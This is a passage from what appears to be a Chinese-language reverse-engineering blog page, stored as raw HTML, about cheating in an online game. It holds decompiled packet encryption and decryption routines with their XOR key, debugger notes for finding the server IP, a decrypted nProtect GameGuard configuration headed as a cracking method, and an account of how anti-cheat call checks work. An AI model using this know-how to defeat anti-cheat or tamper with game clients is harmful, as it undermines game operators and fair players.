class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">_DWORD *__thiscall <span class=\"title\">sub_4A3D07</span><span class=\"params\">(_DWORD *<span class=\"keyword\">this</span>, __int16 *a2, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> a3)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  _DWORD *result; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  __int16 *v5; <span class=\"comment\">// ecx</span></span><br><span class=\"line\">  __int16 *v6; <span class=\"comment\">// edi</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v7; <span class=\"comment\">// ecx</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v8; <span class=\"comment\">// edx</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v9; <span class=\"comment\">// ecx</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v10; <span class=\"comment\">// esi</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v11; <span class=\"comment\">// ecx</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v12; <span class=\"comment\">// kr00_4</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v13; <span class=\"comment\">// edi</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v14; <span class=\"comment\">// ecx</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v15; <span class=\"comment\">// edx</span></span><br><span class=\"line\">  __int16 v16; <span class=\"comment\">// [esp+8h] [ebp-8h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v17; <span class=\"comment\">// [esp+8h] [ebp-8h]</span></span><br><span class=\"line\">  _DWORD *v18; <span class=\"comment\">// [esp+Ch] [ebp-4h]</span></span><br><span class=\"line\">  __int16 *v19; <span class=\"comment\">// [esp+18h] [ebp+8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  result = <span class=\"keyword\">this</span>;</span><br><span class=\"line\">  v16 = *a2;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( *a2 == <span class=\"number\">-5061</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v5 = a2 + <span class=\"number\">4</span>;</span><br><span class=\"line\">    v6 = a2 + <span class=\"number\">6</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v5 = a2 + <span class=\"number\">2</span>;</span><br><span class=\"line\">    v6 = a2 + <span class=\"number\">4</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  v18 = v5;</span><br><span class=\"line\">  v19 = v6;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( a3 &gt;= <span class=\"number\">0xA</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v7 = *result ^ *(_DWORD *)a2;</span><br><span class=\"line\">    *(_DWORD *)a2 = v7;</span><br><span class=\"line\">    v8 = *(_DWORD *)(result[<span class=\"number\">3</span>] + <span class=\"number\">4</span> * result[<span class=\"number\">2</span>] * (v7 &amp; <span class=\"number\">0x3FFF</span>));</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v16 == <span class=\"number\">-5061</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v9 = v8 ^ *((_DWORD *)a2 + <span class=\"number\">1</span>);</span><br><span class=\"line\">      *((_DWORD *)a2 + <span class=\"number\">1</span>) = v9;</span><br><span class=\"line\">      v8 = *(_DWORD *)(result[<span class=\"number\">3</span>] + <span class=\"number\">4</span> * result[<span class=\"number\">2</span>] * (v9 &amp; <span class=\"number\">0x3FFF</span>));</span><br><span class=\"line\">      a3 -= <span class=\"number\">12</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      a3 -= <span class=\"number\">8</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( a3 &gt;&gt; <span class=\"number\">2</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v10 = a3 &gt;&gt; <span class=\"number\">2</span>;</span><br><span class=\"line\">      <span class=\"keyword\">do</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v11 = v8 ^ *(_DWORD *)v6;</span><br><span class=\"line\">        *(_DWORD *)v6 = v11;</span><br><span class=\"line\">        v8 = *(_DWORD *)(result[<span class=\"number\">3</span>] + <span class=\"number\">4</span> * result[<span class=\"number\">2</span>] * (v11 &amp; <span class=\"number\">0x3FFF</span>));</span><br><span class=\"line\">        v6 += <span class=\"number\">2</span>;</span><br><span class=\"line\">        --v10;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">while</span> ( v10 );</span><br><span class=\"line\">      v19 = v6;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    v17 = ~dword_B652DC[a3 &amp; <span class=\"number\">3</span>];\t\t\t<span class=\"comment\">// 00B652DC+2*4   ffff0000     </span></span><br><span class=\"line\">    v12 = a3 &amp; <span class=\"number\">3</span>;</span><br><span class=\"line\">    a3 = *(_DWORD *)v6 ^ v8 &amp; v17;</span><br><span class=\"line\">    <span class=\"built_in\">qmemcpy</span>(v6, &amp;a3, v12);</span><br><span class=\"line\">    v13 = a3;</span><br><span class=\"line\">    *(_DWORD *)v19 = a3;</span><br><span class=\"line\">    *v18 = *(_DWORD *)(result[<span class=\"number\">3</span>] + <span class=\"number\">4</span> * result[<span class=\"number\">2</span>] * (v8 &amp; <span class=\"number\">0x3FFF</span>)) ^ v13 &amp; v17;</span><br><span class=\"line\">    v14 = (result[<span class=\"number\">1</span>] + <span class=\"number\">1</span>) &amp; <span class=\"number\">0x3FFF</span>;</span><br><span class=\"line\">    v15 = v14 * result[<span class=\"number\">2</span>];</span><br><span class=\"line\">    result[<span class=\"number\">1</span>] = v14;</span><br><span class=\"line\">    *result = *(_DWORD *)(result[<span class=\"number\">3</span>] + <span class=\"number\">4</span> * v15);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"解密函数分析-2\"><a class=\"markdownIt-Anchor\" href=\"#解密函数分析-2\">#</a> 解密函数分析</h3>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">004</span>A7E33   .  <span class=\"number\">50</span>            push eax\t\t\t\t\t\t\t\t<span class=\"number\">194B</span>E318</span><br><span class=\"line\"><span class=\"number\">004</span>A7E34   .  FF76 <span class=\"number\">04</span>       push dword ptr ds:[esi+<span class=\"number\">0x4</span>]\t\t\t\t</span><br><span class=\"line\"><span class=\"number\">004</span>A7E37   .  FF15 <span class=\"number\">94660E01</span> call dword ptr ds:[<span class=\"number\">0x10E6694</span>]            ;  Main<span class=\"number\">.01100553</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 下硬件访问断点</span></span><br><span class=\"line\"><span class=\"number\">194B</span>E318      C0 <span class=\"number\">00</span> <span class=\"number\">73</span> <span class=\"number\">04</span> <span class=\"number\">70</span> <span class=\"number\">52</span> <span class=\"number\">21</span> <span class=\"number\">19</span>                          ?s\u0004pR!\u0019.</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// </span></span><br><span class=\"line\"><span class=\"number\">004</span>A3E52  /&gt; \\<span class=\"number\">55</span>            push ebp</span><br><span class=\"line\"><span class=\"number\">004</span>A3E53  |.  <span class=\"number\">8B</span>EC          mov ebp,esp</span><br><span class=\"line\"><span class=\"number\">004</span>A3E55  |.  <span class=\"number\">53</span>            push ebx</span><br><span class=\"line\"><span class=\"number\">004</span>A3E56  |.  <span class=\"number\">8B</span>5D <span class=\"number\">0</span>C       mov ebx,[arg<span class=\"number\">.2</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3E59  |.  <span class=\"number\">56</span>            push esi</span><br><span class=\"line\"><span class=\"number\">004</span>A3E5A  |.  <span class=\"number\">8B</span>75 <span class=\"number\">08</span>       mov esi,[arg<span class=\"number\">.1</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3E5D  |.  <span class=\"number\">8B</span>06          mov eax,dword ptr ds:[esi]</span><br><span class=\"line\"><span class=\"number\">004</span>A3E5F  |.  <span class=\"number\">57</span>            push edi</span><br><span class=\"line\"><span class=\"number\">004</span>A3E60  |.  <span class=\"number\">8B</span>79 <span class=\"number\">0</span>C       mov edi,dword ptr ds:[ecx+<span class=\"number\">0xC</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3E63  |.  <span class=\"number\">8B</span>C8          mov ecx,eax</span><br><span class=\"line\"><span class=\"number\">004</span>A3E65  |.  <span class=\"number\">81F</span>1 F18CB37A <span class=\"keyword\">xor</span> ecx,<span class=\"number\">0x7AB38CF1</span></span><br><span class=\"line\"><span class=\"number\">004</span>A3E6B  |.  <span class=\"number\">890</span>E          mov dword ptr ds:[esi],ecx</span><br><span class=\"line\"><span class=\"number\">004</span>A3E6D  |.  <span class=\"number\">83</span>EB <span class=\"number\">04</span>       sub ebx,<span class=\"number\">0x4</span></span><br><span class=\"line\"><span class=\"number\">004</span>A3E70  |.  <span class=\"number\">8</span>D56 <span class=\"number\">04</span>       lea edx,dword ptr ds:[esi+<span class=\"number\">0x4</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3E73  |.  <span class=\"number\">8B</span>CB          mov ecx,ebx</span><br><span class=\"line\"><span class=\"number\">004</span>A3E75  |.  BE FF3F0000   mov esi,<span class=\"number\">0x3FFF</span></span><br><span class=\"line\"><span class=\"number\">004</span>A3E7A  |.  <span class=\"number\">23</span>C6          <span class=\"keyword\">and</span> eax,esi</span><br><span class=\"line\"><span class=\"number\">004</span>A3E7C  |.  <span class=\"number\">8B</span>0487        mov eax,dword ptr ds:[edi+eax*<span class=\"number\">4</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3E7F  |.  C1E9 <span class=\"number\">02</span>       shr ecx,<span class=\"number\">0x2</span></span><br><span class=\"line\"><span class=\"number\">004</span>A3E82  |.  <span class=\"number\">85</span>C9          test ecx,ecx</span><br><span class=\"line\"><span class=\"number\">004</span>A3E84  |.  <span class=\"number\">7</span>E <span class=\"number\">16</span>         jle XMain<span class=\"number\">.004</span>A3E9C</span><br><span class=\"line\"><span class=\"number\">004</span>A3E86  |.  <span class=\"number\">894</span>D <span class=\"number\">08</span>       mov [arg<span class=\"number\">.1</span>],ecx</span><br><span class=\"line\"><span class=\"number\">004</span>A3E89  |&gt;  <span class=\"number\">8B</span>0A          /mov ecx,dword ptr ds:[edx]</span><br><span class=\"line\"><span class=\"number\">004</span>A3E8B  |.  <span class=\"number\">33</span>C1          |<span class=\"keyword\">xor</span> eax,ecx</span><br><span class=\"line\"><span class=\"number\">004</span>A3E8D  |.  <span class=\"number\">8902</span>          |mov dword ptr ds:[edx],eax</span><br><span class=\"line\"><span class=\"number\">004</span>A3E8F  |.  <span class=\"number\">23</span>CE          |<span class=\"keyword\">and</span> ecx,esi</span><br><span class=\"line\"><span class=\"number\">004</span>A3E91  |.  <span class=\"number\">8B</span>048F        |mov eax,dword ptr ds:[edi+ecx*<span class=\"number\">4</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3E94  |.  <span class=\"number\">83</span>C2 <span class=\"number\">04</span>       |add edx,<span class=\"number\">0x4</span></span><br><span class=\"line\"><span class=\"number\">004</span>A3E97  |.  FF4D <span class=\"number\">08</span>       |dec [arg<span class=\"number\">.1</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3E9A  |.^ <span class=\"number\">75</span> ED         \\jnz XMain<span class=\"number\">.004</span>A3E89</span><br><span class=\"line\"><span class=\"number\">004</span>A3E9C  |&gt;  <span class=\"number\">83E3</span> <span class=\"number\">03</span>       <span class=\"keyword\">and</span> ebx,<span class=\"number\">0x3</span></span><br><span class=\"line\"><span class=\"number\">004</span>A3E9F  |.  <span class=\"number\">8B</span>0C9D F052B6&gt;mov ecx,dword ptr ds:[ebx*<span class=\"number\">4</span>+<span class=\"number\">0xB652F0</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3EA6  |.  <span class=\"number\">5F</span>            pop edi</span><br><span class=\"line\"><span class=\"number\">004</span>A3EA7  |.  F7D1          <span class=\"keyword\">not</span> ecx</span><br><span class=\"line\"><span class=\"number\">004</span>A3EA9  |.  <span class=\"number\">23</span>C8          <span class=\"keyword\">and</span> ecx,eax</span><br><span class=\"line\"><span class=\"number\">004</span>A3EAB  |.  <span class=\"number\">310</span>A          <span class=\"keyword\">xor</span> dword ptr ds:[edx],ecx</span><br><span class=\"line\"><span class=\"number\">004</span>A3EAD  |.  <span class=\"number\">5</span>E            pop esi</span><br><span class=\"line\"><span class=\"number\">004</span>A3EAE  |.  <span class=\"number\">5B</span>            pop ebx</span><br><span class=\"line\"><span class=\"number\">004</span>A3EAF  |.  <span class=\"number\">5</span>D            pop ebp</span><br><span class=\"line\"><span class=\"number\">004</span>A3EB0  \\.  C2 <span class=\"number\">0800</span>       retn <span class=\"number\">0x8</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> __thiscall <span class=\"title\">sub_4A3E52</span><span class=\"params\">(_DWORD *<span class=\"keyword\">this</span>, <span class=\"type\">int</span> *a2, <span class=\"type\">int</span> a3)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v3; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v4; <span class=\"comment\">// edi</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v5; <span class=\"comment\">// ebx</span></span><br><span class=\"line\">  <span class=\"type\">int</span> *v6; <span class=\"comment\">// edx</span></span><br><span class=\"line\">  <span class=\"type\">int</span> result; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v8; <span class=\"comment\">// ecx</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v9; <span class=\"comment\">// [esp+14h] [ebp+8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = *a2;</span><br><span class=\"line\">  v4 = <span class=\"keyword\">this</span>[<span class=\"number\">3</span>];</span><br><span class=\"line\">  *a2 ^= <span class=\"number\">0x7AB38CF1</span>u;</span><br><span class=\"line\">  v5 = a3 - <span class=\"number\">4</span>;</span><br><span class=\"line\">  v6 = a2 + <span class=\"number\">1</span>;</span><br><span class=\"line\">  result = *(_DWORD *)(v4 + <span class=\"number\">4</span> * (v3 &amp; <span class=\"number\">0x3FFF</span>));</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)(a3 - <span class=\"number\">4</span>) &gt;&gt; <span class=\"number\">2</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v9 = v5 &gt;&gt; <span class=\"number\">2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">do</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v8 = *v6;</span><br><span class=\"line\">      *v6 ^= result;</span><br><span class=\"line\">      result = *(_DWORD *)(v4 + <span class=\"number\">4</span> * (v8 &amp; <span class=\"number\">0x3FFF</span>));</span><br><span class=\"line\">      ++v6;</span><br><span class=\"line\">      --v9;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( v9 );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  *v6 ^= result &amp; ~dword_B652F0[v5 &amp; <span class=\"number\">3</span>];</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"解密ip分析\"><a class=\"markdownIt-Anchor\" href=\"#解密ip分析\">#</a> 解密 IP 分析</h3>\n<p>在弹窗的时候去 OD 搜索字符串，注意切换到 dll 中搜索</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231022173327993.png\" alt=\"image-20231022173327993\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231022173457771.png\" alt=\"image-20231022173457771\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">68F81058    6A 00           push 0x0</span><br><span class=\"line\">68F8105A    6A 00           push 0x0</span><br><span class=\"line\">68F8105C    68 3042F868     push cabal_ho.68F84230                   ; language.enc Debug!!!!</span><br><span class=\"line\">68F81061    6A 00           push 0x0</span><br><span class=\"line\">68F81063    FF15 D440F868   call dword ptr ds:[&lt;&amp;USER32.MessageBoxA&gt;&gt;; USER32.MessageBoxA</span><br><span class=\"line\">68F81069    8B4424 20       mov eax,dword ptr ss:[esp+0x20]</span><br><span class=\"line\"></span><br><span class=\"line\">00501E0B   .  55            push ebp                                 ; /hTemplateFile =&gt; NULL</span><br><span class=\"line\">00501E0C   .  68 80000000   push 0x80                                ; |Attributes = NORMAL</span><br><span class=\"line\">00501E11   .  6A 03         push 0x3                                 ; |Mode = OPEN_EXISTING</span><br><span class=\"line\">00501E13   .  55            push ebp                                 ; |pSecurity =&gt; NULL</span><br><span class=\"line\">00501E14   .  6A 01         push 0x1                                 ; |ShareMode = FILE_SHARE_READ</span><br><span class=\"line\">00501E16   .  68 00000080   push 0x80000000                          ; |Access = GENERIC_READ</span><br><span class=\"line\">00501E1B   .  57            push edi                                 ; |FileName</span><br><span class=\"line\">00501E1C   .  FF15 18600E01 call dword ptr ds:[0x10E6018]            ; \\CreateFileA</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>VirtualProtectEx 修改分页内存属性</p>\n<ol>\n<li>\n<p>加载套接字库，创建套接字（WSAStartup ()/socket ()）；</p>\n</li>\n<li>\n<p>向服务器发出连接请求（connect ()）；</p>\n</li>\n<li>\n<p>和服务器进行通信（send ()/recv ()）；</p>\n</li>\n<li>\n<p>关闭套接字，关闭加载的套接字库（closesocket ()/WSACleanup ()）</p>\n</li>\n</ol>\n<h2 id=\"nprotect\"><a class=\"markdownIt-Anchor\" href=\"#nprotect\">#</a> nprotect</h2>\n<ol>\n<li>nProtect GameGuard 含有即时变换侦测规则、可置于游戏可执行文件前使用，利用动态加密的方式达到防止游戏外挂的目的，有效防堵作弊程序（如加速器），以及侦测玩</li>\n<li>家电脑有没有使用游戏插件等。</li>\n<li>nProtect GameGuard 具有多种功能，例如：</li>\n<li>透过持续扫描任何事先有登录过的代码、系统内部时间器运作等方式，侦测玩家电脑有没有使用游戏插件。</li>\n<li>检测及阻挡恶意代码。</li>\n<li>自动扫描工具。</li>\n<li>即时变换侦测。</li>\n<li>可停止鼠标及键盘的驱动程序及侧录程序。</li>\n<li>可阻挡玩家及双重核心处理器（CPU）之不正当的操作。</li>\n<li>占用甚少 CPU，不会拖慢电脑及游戏。</li>\n<li>监控玩家之操作环境，以及一举一动</li>\n</ol>\n<h3 id=\"nprotect-gameguard-ini文件破解手法之解密后的文件一\"><a class=\"markdownIt-Anchor\" href=\"#nprotect-gameguard-ini文件破解手法之解密后的文件一\">#</a> NProtect GameGuard ini 文件破解手法之解密后的文件（一）</h3>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">配置文件解密后的：</span><br><span class=\"line\">[GAMEMON]</span><br><span class=\"line\">GAME_NAME=*</span><br><span class=\"line\">UPDATE_SERVER=*</span><br><span class=\"line\">UPDATE_PATH=/real/</span><br><span class=\"line\">BACKUP_SERVER=</span><br><span class=\"line\">BACKUP_PATH=</span><br><span class=\"line\">OPTION_VALUE=<span class=\"number\">0</span></span><br><span class=\"line\">SPEEDCHECK_INTERVAL=<span class=\"number\">1000</span></span><br><span class=\"line\">SENDERRLOG=<span class=\"number\">3</span></span><br><span class=\"line\">GAMECRC=<span class=\"number\">1</span></span><br><span class=\"line\">USE_GGSCAN=<span class=\"number\">1</span></span><br><span class=\"line\">LOG_SERVER=*</span><br><span class=\"line\">NO_USE_CHECKSC=<span class=\"number\">1</span></span><br><span class=\"line\">NO_USE_CSR=<span class=\"number\">1</span></span><br><span class=\"line\">USE_FHSH=<span class=\"number\">1</span></span><br><span class=\"line\">BWTSERVER=bwt.nprotect2.net</span><br><span class=\"line\">BWT_OPTION=<span class=\"number\">1</span></span><br><span class=\"line\">USE_IHMON=<span class=\"number\">1</span></span><br><span class=\"line\">RT_UPDATE=<span class=\"number\">1</span></span><br><span class=\"line\">RT_UPTIME=<span class=\"number\">7200</span></span><br><span class=\"line\">RT_ENDTIME=<span class=\"number\">30</span></span><br><span class=\"line\">NO_PHIDE=<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"img\"><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\"></p>\n<h3 id=\"nprotect-gameguard-ini文件破解手法之解密函数二\"><a class=\"markdownIt-Anchor\" href=\"#nprotect-gameguard-ini文件破解手法之解密函数二\">#</a> NProtect GameGuard ini 文件破解手法之解密函数（二）</h3>\n<p>对 LoadLibraryA 下段</p>\n<h2 id=\"游戏检测的对抗与防护艺术\"><a class=\"markdownIt-Anchor\" href=\"#游戏检测的对抗与防护艺术\">#</a> 游戏检测的对抗与防护艺术</h2>\n<ol>\n<li>\n<p>从游戏外挂的利用角度来看，外挂的行为无非有如下两种：</p>\n</li>\n<li>\n<p>修改游戏的关键数据和代码：属于篡改行为</p>\n</li>\n<li>\n<p>call 游戏函数：属于未授权访问行为</p>\n</li>\n<li>\n<p>游戏设计者针对这两种行为产生了无数的防护机制。然而道高一尺魔高一尺，逆向人员也根据游戏内的反外挂机制衍生出了相应的对抗手段。</p>\n</li>\n</ol>\n<p>栈回溯检测调用 call</p>\n<p>xdbg 中 call stack</p>\n<h3 id=\"call的检测原理\"><a class=\"markdownIt-Anchor\" href=\"#call的检测原理\">#</a> call 的检测原理</h3>\n<p>当我们正常在游戏中吃药是没有检测的，那是因为我们完完整整的把游戏的代码全部调用了；而我们直接点吃药 call 的时候执行的代码是不完全的。</p>\n<p>那么游戏的开发者就可以在吃药 call 的外层设置一个变量，并且给变量赋值，然后在吃药 call 内层的某一个位置对这个变量的值进行检测。如果值不对，说明代码没有被完全执行。</p>\n<p>在检测完成之后，再修改这个变量的值到原始状态，然后进行下一次检测</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//用于检测的全局变量</span><br><span class=\"line\">int status=0;</span><br><span class=\"line\"></span><br><span class=\"line\">function()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    //调用其他代码...........</span><br><span class=\"line\">    status=1;</span><br><span class=\"line\">    吃药call();</span><br><span class=\"line\">     //调用其他代码...........</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">吃药call()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">     //调用其他代码...........</span><br><span class=\"line\">    if(status==1)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        //正常执行代码</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        //检测到外挂 进行处理</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //再对status进行赋初始值 以便进行下一次检测</span><br><span class=\"line\">    status=0;</span><br><span class=\"line\">     //调用其他代码...........</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"虚拟机检测\"><a class=\"markdownIt-Anchor\" href=\"#虚拟机检测\">#</a> 虚拟机检测</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span 